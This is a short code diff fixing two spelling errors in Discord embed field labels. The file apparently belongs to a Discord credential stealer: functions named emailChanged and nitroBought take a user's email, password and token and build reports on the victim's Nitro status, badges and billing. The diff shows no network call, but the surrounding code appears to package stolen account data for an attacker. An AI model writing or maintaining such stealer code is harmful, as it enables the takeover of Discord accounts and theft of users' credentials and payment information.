@@ -751,7 +751,7 @@ const emailChanged = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '**Discord Informtions**',
+            name: '**Discord Information**',
             value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
@@ -882,7 +882,7 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Informationi**',
+            name: '**Discord Information**',
             value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n <a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n <a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
